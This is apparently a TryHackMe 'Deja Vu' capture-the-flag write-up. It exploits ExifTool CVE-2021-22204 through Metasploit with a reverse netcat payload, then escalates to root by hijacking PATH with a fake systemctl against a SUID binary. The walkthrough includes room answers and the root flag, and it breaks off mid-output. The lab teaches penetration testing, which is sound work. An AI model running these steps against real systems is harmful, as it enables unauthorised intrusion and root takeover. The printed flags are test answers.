---
Exploit a recent code injection vulnerability to take over a website full of cute dog pictures!
---

# Deja Vu — Writeup

## Overview
### Deja Vu — Writeup
### Deja Vu — Writeup
![|222](https://tryhackme-images.s3.amazonaws.com/room-icons/db58ef402783e8d637df6c04ea9e6142.png)
### Deja Vu
This room aims to teach:
Exploring a webapp to discover potential vulnerabilities
Exploiting a discovered vulnerability with Metasploit
Privilege Escalation by PATH exploitation
While this room is a walkthrough, some elements will rely on individual research and troubleshooting.
Credit to Varg for the room icon, webapp logo, and design help throughout the webapp.
Cute animal pictures sourced from the TryHackMe Discord community staff.
Writeups in the format of a Penetration Testing Report are more than welcome. Other writeup formats will be accepted based on quality and novelty.
### Dog Pictures - Exploring a webapp
Webapp Enumeration
After our initial port scan, we find two open ports. As usual, SSH is not much use without credentials as it's up to date. This just leaves us with a web application to explore.
From Nmap's service version detection, we know that the backend is built in Golang. This hopefully means dynamic content that we can explore.
The first step in exploiting a webapp, like exploiting anything else, is reconnaissance. Exploring the webapp to discover functionality is critical for gaining a basic familiarity with the webapp and potentially how it works. Navigating the webapp without actively trying to exploit the functionality is called walking the happy path. You can learn more about this technique (and a lot more) in this room: Walking An Application.
Open up Burp Suite with your browser of choice (I like the integrated Chromium) and we can start exploring the site.
Click around the website. Can you find any developer comments?
<!--
What should happen when we click on a picture of a dog?
How do we style it to make it show that it's clickable?
-->
Can you find the page that gives more details about a dog photo?

## Enumeration
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.192.184 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.192.184:22
Open 10.10.192.184:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-21 13:21 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:21
Completed NSE at 13:21, 0.00s elapsed
Initiating Ping Scan at 13:21
Scanning 10.10.192.184 [2 ports]
Completed Ping Scan at 13:21, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:21
Completed Parallel DNS resolution of 1 host. at 13:21, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:21
Scanning 10.10.192.184 [2 ports]
Discovered open port 22/tcp on 10.10.192.184
Discovered open port 80/tcp on 10.10.192.184
Completed Connect Scan at 13:21, 0.20s elapsed (2 total ports)
Initiating Service scan at 13:21
Scanning 2 services on 10.10.192.184
Completed Service scan at 13:22, 12.83s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.192.184.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:22
Completed NSE at 13:22, 6.33s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.80s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
Nmap scan report for 10.10.192.184
Host is up, received syn-ack (0.20s latency).
Scanned at 2022-09-21 13:21:57 EDT for 21s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 30:0f:38:8d:3b:be:67:f3:e0:ca:eb:1c:93:ad:15:86 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmic6XezAzYEOi8jWokLDH+7zn6LyOEn/8jPWyhJ6yZ6TVq33kzY5NiYwaxYEpj0ohIm2njEHj/4I1a+C7JjRAqwLsVpE/LnHWmvHKCWxqIX+WXJIi8oddWig/xJNlbWLlWBSv/YzIan+x1Ov+/oCGupgy86GyLyKULGUONATY72Ff9VuTQTaZvFgjJDGsdh4obY0ZN4r2PzbzCP6vPtwESx/IYm2fCZwsoev/ml8HSKdTSRacavnzxShr6PuYBOSJmVBbc9sI4rET/7I6bkS8gqAsCPx3DJ0IS+JlVMvXhp3ze5fgAlGf01Xr2lpPxb5uKHVZxu9htJUHv0wRUwASkx2YlTOSWvrGsGWblcKYvh0YmPu37XuRVTEe62ph6c2LPAfBO8WU4/vOo0aanue6W0b9joomDDbAltWBazLj8r87hQnELu4tSjS7MiV2H6q9Ak05ZniG1RYGANC+3IP0kWvehVd1I4FHkIdfQk5Rxv+lqHGi+hRpnzIh0kzk0bc=
|   256 46:09:66:2b:1f:d1:b9:3c:d7:e1:73:0f:2f:33:4f:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOCGDIUZtk9Q/FYmvIUjhKFAO7dMgZgAMgwUoXR+yGb4B/fovHWBLq5Du9i8kyd8FmiY8efx2V8VE8STgcmNQi8=
|   256 a8:43:0e:d2:c1:a9:d1:14:e0:95:31:a1:62:94:ed:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/RIq26NuKMoJYyJgIRuwjFFrk7kgMqQEcRVMTOlftl
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Dog Gallery!
|_http-favicon: Unknown favicon MD5: C1359D2DB192C32E31BDE9E7BDE0243B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:22
Completed NSE at 13:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.79 seconds
```
Perform an Nmap scan of the target. What version of SSH is in use?
*OpenSSH 8.0 (protocol 2.0)*
Privesc Enumeration
Now that we have code execution, our goal should be rooting the box. Fortunately, something should immediately catch your attention if you run ls -lah from the current working directory. A SUID binary! The presence of one of these in a home directory is quite unusual, but it looks like we have a file left by the server administrator to help manage the webserver. It also looks like we have the source code for this C program, very useful for exploiting it.
A note on SELinux
SELinux improves security by essentially setting out rules that processes are made to follow.
While SELinux can make hacking a box more difficult, it can also make administering a server more difficult.
Rather than trying to configure SELinux to allow the webserver to bind to port 80, the system administrator just disabled it. This is a somewhat common approach, but is by no means the "correct" approach which would be learning the fundamentals of SELinux and configuring it correctly. With the command getenforce we can verify whether SELinux is enforcing its rules (the command prints disabled).
While SELinux doesn't affect the privesc we use here, it is worth bearing in mind in real pentests or harder rooms.
You can read more about SELinux at these links:
https://selinuxproject.org/page/FAQ
https://www.redhat.com/en/topics/linux/what-is-selinux
Understanding SUID binaries
A SUID binary has special permissions, allowing the program to use the setuid system call. The setuid call allows the process to set its user id. If you call setuid(0) and the process has the correct permissions, then the program will then run as root.
When a program may need to run parts of the code as root but does not want to run the whole program as root, SUID is often used. An example of this would be the webserver Apache2, which initially runs as root to bind to port 80 and then subsequently drops these elevated privileges.
SUID binaries can only set their UID to the owner of the binary's UID unless the binary is owned by root, in which case they can set it to any UID. You usually don't have to call setuid yourself, the program will usually do this.
A more modern alternative to setuid binaries is Linux Capabilities, which offer much more granular control over permissions such as CAP_NET_BIND_SERVICE which allows programs to bind to low (privileged, under 1024) ports without running as root. The capability CAP_SET_UID is equivalent to  suid permissions, allowing the program to call setuid
What does the vulnerable binary do?
If we run the binary, with ./serverManager, we get a choice of operations.
Selecting 0 gives us the status of the webserver service, and 1 allows us to restart it. Restarting the service would usually require root privileges, so it makes some sense that the binary is SUID.
```text
Reverse Shell

           
[dogpics@dejavu ~]$ ./serverManager 
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -	Get server status
1 -	Restart server
0
● dogpics.service - Dog pictures
   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
   Active: active (running) since Sat 2021-09-11 18:00:08 BST; 19min ago
 Main PID: 776 (webserver)
    Tasks: 7 (limit: 5971)
   Memory: 76.8M
   CGroup: /system.slice/dogpics.service
           └─776 /home/dogpics/webserver -p 80

Sep 11 18:00:08 dejavu systemd[1]: Started Dog pictures.
```
As we have the source code of the application, we can more easily see the vulnerability.
```text
serverManager.c - vi

           
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{   
    setuid(0);
    setgid(0);
    printf(
        "Welcome to the DogPics server manager Version 1.0\n"
        "Please enter a choice:\n");
    int operation = 0;
    printf(
        "0 -\tGet server status\n"
        "1 -\tRestart server\n");
    while (operation < 48 || operation > 49) {
        operation = getchar();
        getchar();
        if (operation < 48 || operation > 49) {
            printf("Invalid choice.\n");
        }
    }
    operation = operation - 48;
    //printf("Choice was:\t%d\n",operation);
    switch (operation)
    {
    case 0:
        //printf("0\n");
        system("systemctl status --no-pager dogpics");
        break;
    case 1:
        system("sudo systemctl restart dogpics");
        break;
    default:
        break;
    }
}
```
The vulnerability comes from calling system() without providing a full path to the binary. This means that we can create a fake systemctl binary which will run as root, and escalate our privileges.
We can also use a program called ltrace which allows us to see system and library calls, although this is not installed on the machine. Pay close attention to the system() seen earlier that provides systemctl without its full path.
```text
james@centos

           
[james@centos]$ ltrace -b -a 100 ./serverManager
setuid(0)                                                                                          = -1
setgid(0)                                                                                          = -1
puts("Welcome to the DogPics server ma"...Welcome to the DogPics server manager Version 1.0
Please enter a choice:
)                                                        = 73
puts("0 -\tGet server status\n1 -\tRestar"...0 -        Get server status
1 -     Restart server
)                                                     = 41
getchar(0, 0x25d62a0, 0x7f8d48b99860, 0x7f8d488c56480
)                                              = 48
getchar(0, 0x25d66b0, 0x25d66b1, 0x7f8d488c55a5)                                                   = 10
system("systemctl status --no-pager dogp"...● dogpics.service - Dog pictures
   Loaded: loaded (/etc/systemd/system/dogpics.service; enabled; vendor preset: disabled)
   Active: active (running) since Sat 2021-09-11 18:28:17 BST; 6min ago
 Main PID: 894 (webserver)
    Tasks: 6 (limit: 24819)
   Memory: 17.9M
   CGroup: /system.slice/dogpics.service
           └─894 /home/dogpics/webserver -p 80
)                                                      = 0
```
Explaining the PATH variable
The PATH variable tells the shell where to look for binaries that you call by name, so for example ls is actually /bin/ls. It consists of a sequence of directories, separated by colons. Your shell will run the first binary that matches, looking in each directory left to right. This direction is important.
What are we exploiting?
We're exploiting a combination of two things here.
Firstly, the binary runs as root due to SUID.
Secondly, the binary calls systemctl with an incomplete path (eg not /usr/bin/systemctl, just systemctl on it's own.)
Because the system will run the first binary it finds from PATH that matches systemctl here, we can make our own fake systemctl to run instead, which will be ran as root (as it inherits the UID and GID of the parent process).
Our fake systemctl can be as simple as /bin/bash in plaintext to start a new shell - Linux treats executable text files as shell scripts.
Let's create a fake systemctl, add it to path, and get root.
```text
Reverse Shell

           
[dogpics@dejavu ~]$ which systemctl
/usr/bin/systemctl
[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl
[dogpics@dejavu ~]$ chmod +x systemctl
[dogpics@dejavu ~]$ export PATH=.:$PATH
[dogpics@dejavu ~]$ which systemctl
./systemctl
[dogpics@dejavu ~]$ ./serverManager 
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -	Get server status
1 -	Restart server
0
[root@dejavu ~]# whoami
root
```
Let's break this down:
[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl - We're creating a plaintext file with the contents /bin/bash which will start a shell when executed.
[dogpics@dejavu ~]$ chmod +x systemctl - We need to make our fake systemctl executable, otherwise it will be ignored.
[dogpics@dejavu ~]$ export PATH=.:$PATH - here, we add . (our current working directory) to the beginning of PATH. This means the system will look in our current working directory for binaries before searching the rest of PATH, and find our fake systemctl before the genuine one.
[dogpics@dejavu ~]$ which systemctl - To check that our fake systemctl will run if the command systemctl is used, we use which. which essentially does the PATH lookup for us and prints the results.
[dogpics@dejavu ~]$ ./serverManager - Run the vulnerable binary!
From there, you should have a root shell. As a warning, your HOME variable is still /home/dogpics rather than /root so you will need to cd /root. Then just grab the flag.
Further reading on this method
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
Stabilise your reverse shell to ensure that you can run interactive binaries
Find the SUID binary
Verify (based on output) that the serverManager program runs systemctl when you run it.
Try running the same command as the binary yourself - systemctl status dogpics --no-pager
Create your fake systemctl, ensure it's correctly added to PATH, and escalate your privileges.
Retrieve the root flag from /root/root.txt. What is the root flag?
*dejavu{735c0553063625f41879e57d5b4f3352}*

## Exploitation
Delving deeper
After we've gained a basic familiarity with the site, we can start some more active enumeration. A directory brute force scan can help us discover content that's otherwise unreachable through normal browsing, like admin pages or old versions that haven't been removed. With admin pages leading to more application features that might not be hardened, or unmaintained code from outdated versions, we're more likely to find vulnerabilities.
Run a gobuster scan with dirb's big.txt wordlist. What can you find? Other tools and wordlists are available.
With an API driven webapp like this, we can see how the application retrieves data to make it dynamic. A great way to do this is Burp Suite, which can automatically map out the target site's structure as we explore.
Discovering the overly verbose API
Burp Suite's target site map should have discovered 2 API routes that the website uses to retrieve information about the dog pictures. One retrieves the title and caption, and the other is used to retrieve the date and author. The full paths have been redacted, so that you find them yourself.
It appears the API route used to retrieve the date and author does so with EXIF data, and uses Exiftool from the response. It appears the output of the command is simply serialised into JSON and sent to the client. This gives us a lot of information, notably the ExifTool version number. This is considered a vulnerability under the [OWASP API Top 10](https://owasp.org/www-project-api-security/), more specifically API3:2019 Excessive Data Exposure. Usually, exposing version numbers would be considered a low or informational rated issue but as we will discover it can have more serious consequences.
What page can be used to upload your own dog picture?
*/upload/*
```text
async function getData(url = '') {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'GET', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
    });
    return await response.json(); // parses JSON response into native JavaScript objects
}

async function loadDogImage() {
    const urlParams = new URLSearchParams(window.location.search);
    const dogDiv = document.querySelector("#dogPicDiv")
    const imageElem = document.createElement("img")
    imageElem.src = "/dog/get/"+urlParams.get("id")
    dogDiv.prepend(imageElem)
    const exifData = await getData("/dog/getexifdata/"+urlParams.get("id"))
    const captionTitleData = await getData("/dog/getmetadata/"+urlParams.get("id"))
    const imageAuthor = document.querySelector("#imageAuthor")
    const imageDate = document.querySelector("#imageDate")
    const dogTitle = document.querySelector("#dogTitle")
    const dogCaption = document.querySelector("#dogCaption")

    dogTitle.textContent = captionTitleData.title;
    dogCaption.textContent = captionTitleData.caption;
    imageDate.textContent = (exifData[0].Date ? exifData[0].Date : "No date.")
    imageAuthor.textContent = (exifData[0].Artist ? exifData[0].Artist : "No Author.")
}
```
What API route is used to provide the Title and Caption for a specific dog image?
*/dog/getmetadata*  looking view-source:http://10.10.192.184/dogpic/dogpic.js
What API route does the application use to retrieve further information about the dog picture?
*/dog/getexifdata*
![[Pasted image 20220921123700.png]]
What attribute in the JSON response from this endpoint specifies the version of ExifTool being used by the webapp?
*ExifToolVersion* (using burpsuite)
What version of ExifTool is in use?
*12.23*
What RCE exploit is present in this version of ExifTool? Give the CVE number in format CVE-XXXX-XXXXX
*CVE-2021-22204 *   [exiftool 12.23 exploit db](https://www.exploit-db.com/exploits/50911)
Now that we've discovered a potential method of exploiting the box, we should try it!
Turning our version disclosure into remote code execution massively increases the severity of the issue.
Why is this exploit interesting?
In the Microsoft ecosystem, there's a concept called "Patch Tuesday"; security patches for Microsoft products are often released on Tuesdays.
Practically immediately after these patches are released, work begins on creating exploits for the vulnerabilities as many systems will not be immediately updated.
Exiftool follows a similar story here. In early 2021, an exploit was discovered in Exiftool that could lead to arbitrary code execution. The exploit was quickly patched before public proof of concept code started to appear, however many security enthusiasts began to reverse engineer the patch to create an exploit.
Looking for the patch
Researching the vulnerability, we can see it was assigned CVE-2021-22204. Looking at the [NVD CVE page](https://nvd.nist.gov/vuln/detail/CVE-2021-22204) for the flaw shows that it was patched in 12.24. The page also has a link to the patch, which is very useful here because we can see how they fixed the vulnerability. The git diff is copied below.
```text
-	230	# must protect unescaped "$" and "@" symbols, and "\" at end of string
-	231	$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
-	232	# convert C escape sequences (allowed in quoted text)
-	233	$tok = eval qq{"$tok"};
+	230	# convert C escape sequences, allowed in quoted text
+	231	# (note: this only converts a few of them!)
+	232	my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n",
+	233	r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
+	234	$tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs;
```
Understanding the code, and the danger
The dangerous function here is the call to eval on line 233. Eval is used to run Perl code that's contained in a variable, and the variable comes from EXIF data in our image. Control over code that's executed is our goal, so it currently seems like the only barrier between us and arbitrary code execution is the filter found on line 231.
```text
# must protect unescaped "$" and "@" symbols, and "\" at end of string
$tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
```
It's worth explaining the =~ that's used here. It's a Perl operator usually used with regular expressions, and it can be very very complicated. Importantly for us, the first character after the ~ is 's'. This means that the operator will perform a search and replace with the regular expression that follows.
That regular expression is also very complicated, unfortunately. There's a helpful comment explaining the intent, escaping special characters in the string. Another unfortunate discovery, if we look at the source code surrounding our filter which wasn't captured in the diff, is that this filter also relies on quote marks delimiting the ends of fields.
Combining all this information, we can see how a code injection vulnerability would arise if we can bypass the filter and have Perl eval our own code. As this filter is irritating and the exploit is somewhat complex to engineer, we'll simply use Metasploit to craft our exploit. Articles describing how an exploit was created manually are included later.
Creating our exploit with Metasploit
Warning: The TryHackMe AttackBox and TryHackMe Kali use Metasploit 5 which is missing this exploit. Use your own virtual machine or find a manual exploit.
To create our exploit, we need to first find the Metasploit module for this vulnerability. If you're unfamiliar with locating exploits in Metasploit, try the TryHackMe Metasploit Intro room.
We then need to set our options appropriately for a reverse shell payload. As it's a Perl command injection vulnerability, we want a command payload rather than a binary payload. Make sure your LHOST is correct and make sure you start a netcat listener!
```text
msfconsole
```
```text
msf6 > search exiftool

Matching Modules
================
```
```text
#  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection

Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
```
```text
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
```
```text
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > show options

Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.jpg          yes       Output file

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.147.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**

Exploit target:

   Id  Name
   --  ----
   0   JPEG file
```
```text
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) >
```
More information
If you didn't like my explanations, want to learn more, or you want to see how the proof of concepts were created, please see the links below.
https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/
https://blogs.blackberry.com/en/2021/06/from-fix-to-exploit-arbitrary-code-execution-for-cve-2021-22204-in-exiftool
https://www.openwall.com/lists/oss-security/2021/05/10/5
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ searchsploit exiftool          
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                                | linux/local/50911.py
------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ msfconsole -q
```
```text
msf6 > search exiftool

Matching Modules
================
```
```text
#  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection
   1  exploit/multi/http/gitlab_exif_rce                        2021-04-14       excellent  Yes    GitLab Unauthenticated Remote ExifTool Command Injection
